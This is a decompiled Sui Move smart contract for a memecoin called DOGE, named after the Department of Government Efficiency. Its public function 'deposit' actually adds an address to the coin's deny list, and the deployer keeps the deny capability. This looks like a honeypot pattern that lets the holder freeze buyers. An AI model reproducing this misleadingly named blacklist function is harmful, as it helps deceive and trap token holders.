module 0x33c1a8979191472897e1a80def34991145eda803546326822ba2ac9f7e4d54a2::doge {
    struct DOGE has drop {
        dummy_field: bool,
    }

    public fun deposit(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<DOGE>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<DOGE>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: DOGE, arg1: &mut 0x2::tx_context::TxContext) {
        let v0 = trim_right(b"111111111   ");
        let v1 = trim_right(b"https://dd.dexscreener.com/ds-data/tokens/solana/9TY6DUg1VSssYH5tFE95qoq5hnAGFak4w3cn72sJNCoV.png?size=lg&key=2f6eeb                                                                                                                                                                                                            ");
        let v2 = if (0x1::vector::length<u8>(&v1) == 0) {
            0x1::option::none<0x2::url::Url>()
        } else {
            0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(v1))
        };
        let (v3, v4, v5) = 0x2::coin::create_regulated_currency_v2<DOGE>(arg0, (0x1::vector::length<u8>(&v0) as u8), 0x1::ascii::into_bytes(0x1::string::to_ascii(0x1::string::utf8(trim_right(b"DOGE    ")))), trim_right(b"Department of Gov Efficiency    "), trim_right(b"The Department of Government Efficiency, proposed by Donald Trump, would be led by Elon Musk to audit federal spending, reduce waste, and propose reforms to enhance government performance, reflecting their recent political alliance.                                                                                        "), v2, false, arg1);
        let v6 = v3;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<DOGE>>(v5);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<DOGE>>(v6);
        0x2::transfer::public_transfer<0x2::coin::Coin<DOGE>>(0x2::coin::mint<DOGE>(&mut v6, 1000000000000000000, arg1), 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<DOGE>>(v4, 0x2::tx_context::sender(arg1));
    }

    fun trim_right(arg0: vector<u8>) : vector<u8> {
        let v0 = 32;
        let v1 = &v0;
        while (0x1::vector::length<u8>(&arg0) > 0) {
            if (0x1::vector::borrow<u8>(&arg0, 0x1::vector::length<u8>(&arg0) - 1) != v1) {
                break
            };
            0x1::vector::pop_back<u8>(&mut arg0);
        };
        arg0
    }

    // decompiled from Move bytecode v6
}

